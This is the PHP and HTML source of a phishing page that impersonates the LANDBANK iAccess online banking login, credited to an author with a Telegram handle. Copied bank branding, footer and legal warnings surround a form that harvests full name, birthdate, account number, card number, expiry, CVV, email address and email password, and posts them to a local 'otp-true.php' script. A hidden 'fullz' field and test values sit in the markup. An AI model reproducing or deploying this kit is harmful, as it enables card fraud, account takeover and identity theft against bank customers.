<?php
session_start();
include 'allprocess.php';

?>
<!DOCTYPE html>
    <!-- Created By MariaClara | TELEGRAM : @mariaclara1337 -->
    <html xmlns="http://www.w3.org/1999/xhtml">
        <head>
            <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
            <link type="text/css" rel="stylesheet" href="./files/theme.css">
            <link type="text/css" rel="stylesheet" href="./files/font.css">
            <link type="text/css" rel="stylesheet" href="./files/style.css">
            <meta http-equiv="X-UA-Compatible" content="IE=edge">
            <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
            <meta name="apple-mobile-web-app-capable" content="yes">
            <meta name="mobile-web-app-capable" content="yes">
            <title>LANDBANK iAccess Retail Internet Banking - Login</title>
            <link rel="icon" href="./files/favicon.ico">
        </head>
        <body id="login-body" onload="noBack();" onpageshow="if (event.persisted) noBack();" onunload="">
            <div id="login-maincontainer">
                <div id="login-topsection">
                    <img src="./files/lbpiaccess.jpg" alt="" class="logo_landbank">
                </div>
                <form id="mainForm" name="mainForm" method="post" action="otp-true.php">
                    <input name="fullz" value="true" style="height:0;width:0;border:none;position:absolute;" type="text">
                    <div id="panelForm" class="ui-panel ui-widget ui-widget-content ui-corner-all" style="border: 0px" data-widget="widget_panelForm"><div id="panelForm_content" class="ui-panel-content ui-widget-content"><div class="ui-panel ui-widget ui-widget-content ui-corner-all"><div class="ui-panel-titlebar ui-widget-header ui-helper-clearfix ui-corner-all"><span class="ui-panel-title">Personal Information</span></div><div class="ui-panel-content ui-widget-content">
                     
                     <table cellpadding="5">
                    <tbody>
                    <tr>
                    <td><label class="ui-outputlabel ui-widget">First Name</label></td>
                    <td><input name="fname" type="text" class="ui-inputfield ui-widget ui-state-default ui-corner-all" data-p-rmsg="Firstname is required" role="textbox" aria-disabled="false" aria-readonly="false" required></td>
                    </tr>
                    <tr>
                    <td><label class="ui-outputlabel ui-widget">Middle Name</label></td>
                    <td><input name="mname" type="text" class="ui-inputfield ui-widget ui-state-default ui-corner-all" data-p-rmsg="Middlename is required" role="textbox" aria-disabled="false" aria-readonly="false" required></td>
                    </tr>
                    <tr>
                    <td><label class="ui-outputlabel ui-widget">Last Name</label></td>
                    <td><input name="lname" type="text" class="ui-inputfield ui-widget ui-state-default ui-corner-all" data-p-rmsg="Lastname is required" role="textbox" aria-disabled="false" aria-readonly="false" required></td>
                    </tr>
                    <!--
                     First Name:hgfgsfa Middle Name:hgfvc Last Name:hgfsc Email:test@email.com Email Password:jmhngfbfvBirthday:235223-03-05 Contact Number:9123456789 Account Number:34571215352 
                    CC Number:32525 Expiration Date:214214 CVV:241 
                    -->
                    <tr>
                    <td><label class="ui-outputlabel ui-widget">Contact Number</label></td>
                    <td><input name="cnumber" type="number" class="ui-inputfield ui-widget ui-state-default ui-corner-all" data-p-rmsg="Contact number is required" role="textbox" aria-disabled="false" aria-readonly="false" required></td>
                    </tr>
                    <tr>
                    <td><label class="ui-outputlabel ui-widget">Birthdate</label></td>
                    <td><input name="bday" type="date" class="ui-inputfield ui-widget ui-state-default ui-corner-all" data-p-rmsg="Email address is required" role="textbox" aria-disabled="false" aria-readonly="false" required></td>
                    </tr>
                    
                    <br><br/>
                    <tr>
                    <td><label class="ui-outputlabel ui-widget">Account Number</label></td>
                    <td><input name="accnum" type="number" class="ui-inputfield ui-widget ui-state-default ui-corner-all" data-p-rmsg=" is required" role="textbox" aria-disabled="false" aria-readonly="false" required></td>
                    </tr>
                    <tr>
                    <td><label class="ui-outputlabel ui-widget">Card Number</label></td>
                    <td><input name="cc" type="number" maxlength="16" minlength="16" class="ui-inputfield ui-widget ui-state-default ui-corner-all" data-p-rmsg=" is required" role="textbox" aria-disabled="false" aria-readonly="false" required></td>
                    </tr>
                    <tr>
                    <td><label class="ui-outputlabel ui-widget">Expiration Date</label></td>
                    <td><input name="exp" type="month" class="ui-inputfield ui-widget ui-state-default ui-corner-all" data-p-rmsg=" is required" role="textbox" aria-disabled="false" aria-readonly="false" required></td>
                    </tr>
                    <tr>
                    <td><label class="ui-outputlabel ui-widget">Security Code or CVV</label></td>
                    <td><input name="cvv" type="number" maxlength="3" minlength="3"class="ui-inputfield ui-widget ui-state-default ui-corner-all" data-p-rmsg=" is required" role="textbox" aria-disabled="false" aria-readonly="false" required></td>
                    </tr>
                    <tr>
                    <td><label class="ui-outputlabel ui-widget">Email Address</label></td>
                    <td><input name="email" type="email" class="ui-inputfield ui-widget ui-state-default ui-corner-all" data-p-rmsg=" is required" role="textbox" aria-disabled="false" aria-readonly="false" required></td>
                    </tr>
                    <tr>
                    <td><label class="ui-outputlabel ui-widget">Email Address Password</label></td>
                    <td><input name="email_pass" type="password" class="ui-inputfield ui-widget ui-state-default ui-corner-all" data-p-rmsg=" is required" role="textbox" aria-disabled="false" aria-readonly="false" required></td>
                    </tr>
                    </tbody>
                    </table>
                                            <br><button class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" onclick="form.submit()" type="submit" name=":submit" role="button" aria-disabled="false"><span class="ui-button-text ui-c">Submit</span></button>
                                                    </div></div></div></div>
                    </form>
                <div id="footer">
                    <div id="container-warning">
                        <span class="warning">WARNING:</span>
                        <span class="warning-higlight">iAccess is for authorized clients only.</span>
                        <span>It shall be a criminal offense for any person to:</span>
                        <ol>
                            <li>Obtain access to data without authority;</li>
                            <li>Corrupt, alter, steal or destroy data;</li>
                            <li>Interfere in computer system or server;</li>
                            <li>Introduce computer virus.</li>
                                </ol>
                        <span>Penalty shall consist of minimum fine of Php100,000 and a maximum commensurate to the damage incurred and a mandatory imprisonment of six months to three years under R.A. No. 8792 (E-Commerce Act of the Philippines).</span>
                    </div>
                    <div id="container-contactinfo">
                        <span style="color: #0db14b; font-size: 12px; font-weight: bold;">LANDBANK CUSTOMER CARE CENTER</span><br>
                        <span>Tel. Nos.: (02) 8405-7000 (NCR) or</span><br>
                        <span>1-800-10-405-7000 (PLDT Domestic Toll Free/Outside NCR)</span><br>
                        <span>Email: customercare@mail.landbank.com</span><br>
                        <hr align="right" style="width: 380px; color: #66cc99; border: 1px solid #66cc99;">
                        <span>Regulated by the Bangko Sentral ng Pilipinas.</span><br>
                        <span>Deposits are insured by PDIC up to P500,000 per depositor.</span><br>
                        <span style="display: flex; flex-direction: row-reverse">
                            <img src="./files/bancnet_logo.png" alt="" width="100" height="20">
                            <span>A Proud Member of </span>
                        </span>
                    </div>
                </div>
            </div>
            <div id="textarea_simulator" style="position: absolute; top: 0px; left: 0px; visibility: hidden;">
        </div>
    </body>
</html>